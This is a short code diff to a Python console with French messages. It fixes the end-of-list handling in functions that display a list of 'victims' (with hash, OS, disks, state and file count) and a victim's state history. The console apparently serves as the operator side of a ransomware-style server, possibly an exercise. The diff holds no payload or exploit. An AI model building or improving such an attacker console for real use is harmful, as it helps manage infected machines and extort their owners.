@@ -54,12 +54,12 @@ def affichage_liste_victimes():
             if response is None:
                 print("Aucune réponse reçue.")
                 return
-            else:
+            elif response is not None and message.get_message_type(response) != 'LIST_END':
                 data = list(response.values())
                 print(
                     f"ID : {data[0]} | HASH: {data[1]} | OS: {data[2]} | Disks: {data[3]} | State: {data[4]} | Nb_files: {data[5]}")
 
-            if message.get_message_type(response) == 'LIST_END':
+            else:
                 break  # Si c'est la fin de la liste, sortir de la boucle
     except Exception as e:
         print(f"Erreur lors de la communication avec le serveur : {e}")
@@ -100,13 +100,12 @@ def affichage_historique_etat_victime():
             if response is None:
                 print("Aucune réponse reçue.")
                 return
-            else:
+            elif response is not None and message.get_message_type(response) != 'HIST_END':
                 data = list(response.values())
                 print(
                     f"ID_STATES: {data[0]} | ID_VICTIM: {data[1]} | TIMESTAMP: {format_timestamp(data[2])} | STATE: {data[3]}")
-
-            if message.get_message_type(response) == 'LIST_END':
-                break  # Si c'est la fin de la liste, sortir de la boucle
+            else:
+                break
     except Exception as e:
         print(f"Erreur lors de la communication avec le serveur : {e}")
     finally:
